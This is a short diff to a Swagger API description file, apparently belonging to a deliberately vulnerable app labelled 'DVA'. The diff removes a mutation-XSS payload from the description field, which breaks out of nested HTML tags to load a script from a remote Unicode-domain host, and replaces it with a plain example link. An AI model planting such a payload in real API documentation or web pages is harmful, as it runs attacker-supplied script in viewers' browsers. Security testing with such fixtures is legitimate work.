@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <h1>DVA Injected Code</h1><svg></p><style><a id="</style><script/src=//Ǌ.₨></script>">
+    <h1>DVA Injected Code</h1><a href="https://www.example.com">Example Link DVA</a>
 
   version: production
 basePath: /DVA/
